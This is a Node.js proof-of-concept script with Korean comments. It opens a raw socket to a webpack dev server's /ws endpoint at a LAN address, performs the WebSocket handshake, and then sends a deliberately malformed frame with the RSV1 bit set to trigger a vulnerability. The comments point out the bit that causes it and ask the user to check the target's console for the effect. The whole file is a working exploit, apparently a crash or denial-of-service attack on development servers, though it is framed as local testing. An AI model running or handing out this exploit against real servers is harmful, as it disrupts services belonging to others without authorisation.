const net = require('net');

// 테스트할 로컬 서버의 주소와 포트를 설정하세요. (Vue CLI 기본값: 8080)
// 만약 다른 포트(예: 3000)에서 테스트하려면 이 값을 수정하면 됩니다.
const host = '192.168.45.215';
const port = 8080;    // <-- 이렇게 수정!

const client = new net.Socket();

client.connect(port, host, () => {
    console.log(`[+] ${host}:${port} 서버에 연결되었습니다.`);
    console.log('[+] WebSocket 핸드셰이크를 시작합니다...');
    
    // 1. Webpack Dev Server의 기본 웹소켓 엔드포인트(/ws)로 연결 요청
    const handshake = 
        "GET /ws HTTP/1.1\r\n" +
        `Host: ${host}:${port}\r\n` +
        "Upgrade: websocket\r\n" +
        "Connection: Upgrade\r\n" +
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" +
        "Sec-WebSocket-Version: 13\r\n\r\n";
        
    client.write(handshake);
});

client.on('data', (data) => {
    const response = data.toString();
    
    // 2. 서버가 웹소켓 연결을 수락(101 Switching Protocols)한 경우
    if (response.includes('101 Switching Protocols')) {
        console.log('[+] 핸드셰이크 성공! 취약점 트리거를 위한 조작된 패킷을 전송합니다...');

        // 3. RSV1 비트가 강제로 켜진(Set) 비정상 웹소켓 프레임 생성
        // 0xC1 = 11000001 (FIN=1, RSV1=1(<- 취약점 원인), RSV2=0, RSV3=0, Opcode=1(Text))
        // 0x80 = 10000000 (Mask=1, PayloadLength=0)
        // 0x00 0x00 0x00 0x00 = Mask Key (4 bytes)
        const maliciousFrame = Buffer.from([0xC1, 0x80, 0x00, 0x00, 0x00, 0x00]);
        
        client.write(maliciousFrame);
        console.log('[!] 조작된 패킷 전송 완료. 대상 프론트엔드 서버의 터미널(콘솔)을 확인해보세요.');
        
        // 전송 완료 후 연결 닫기
        setTimeout(() => {
            client.destroy();
        }, 1000);
    } else if (response.includes('404') || response.includes('400')) {
        console.log('[-] 서버가 웹소켓 연결을 거부했습니다 (HTTP 상태 코드 응답):');
        console.log(response.split('\r\n')[0]); // 응답 첫 줄만 출력
        client.destroy();
    }
});

client.on('close', () => {
    console.log('[*] 연결이 종료되었습니다.');
});

client.on('error', (err) => {
    console.error('[-] 소켓 에러 (연결 실패):', err.message);
});